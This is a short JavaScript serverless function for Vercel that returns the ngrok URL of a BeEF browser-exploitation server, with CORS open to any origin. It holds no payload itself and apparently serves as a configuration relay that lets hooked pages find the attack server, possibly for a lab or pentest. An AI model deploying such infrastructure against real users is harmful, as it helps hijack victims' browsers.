/**
 * Vercel Serverless Function
 * Returns BeEF server configuration (ngrok URL)
 
 * Environment Variable Required:
 * BEEF_SERVER_URL = https://your-ngrok-url.ngrok-free.app
 */

export default function handler(req, res) {
  // Set CORS headers to allow requests from any origin
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'GET') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  const beefServerUrl = process.env.BEEF_SERVER_URL;

  if (!beefServerUrl) {
    console.error('BEEF_SERVER_URL environment variable not set');
    res.status(500).json({ 
      error: 'Configuration error',
      message: 'BeEF server URL not configured'
    });
    return;
  }

  // Return configuration
  res.status(200).json({
    beefServer: beefServerUrl,
    timestamp: new Date().toISOString(),
    status: 'active'
  });
}